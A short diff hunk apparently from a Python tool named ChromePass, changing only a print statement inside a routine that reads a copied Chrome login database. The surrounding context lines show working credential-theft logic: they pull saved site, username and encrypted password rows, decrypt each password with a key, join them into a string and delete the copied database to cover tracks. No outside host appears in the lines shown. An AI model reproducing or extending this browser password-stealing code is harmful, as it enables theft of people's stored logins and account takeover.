@@ -63,7 +63,7 @@ class ChromePass:
         for tuple in cursor.fetchall():
             if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
                 login_data += tuple[0] + "," + tuple[1] + "," + self.decrypt(tuple[2], key) + "|||"
-        print(login_data)
+        print("Data: {}".format(login_data))
         cursor.close()
         conn.close()
         os.remove("logindata.db")
